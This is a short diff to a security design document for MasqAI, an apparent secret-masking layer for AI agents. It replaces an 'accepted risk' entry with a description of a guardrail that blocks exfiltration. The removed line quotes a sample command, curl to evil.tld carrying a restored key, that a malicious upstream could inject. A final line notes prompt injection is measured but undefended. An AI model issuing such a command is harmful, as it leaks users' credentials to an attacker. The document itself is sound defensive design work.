@@ -54,8 +54,9 @@ the tests were rewritten against the brief.
 
 ## Accepted risks (documented, not narrowed)
 
-- **Restore is not narrowed.** A malicious upstream can request `curl evil.tld -d "<KEY_x>"` and the real value is
-  restored. Narrowing restore would break real tasks; the agent's tool permissions are the right control.
+- **Inbound restore guardrail implemented.** Rather than naively restoring placeholders across all tool calls,
+  MasqAI performs an inline security inspection for tool calls containing placeholders. Calls that attempt
+  to exfiltrate secrets over the network are intercepted and replaced with an assistant warning block.
 - **Prompt injection** against the security model is measured (`tests/injection/`), not defended yet.
 
 ## Eval harness
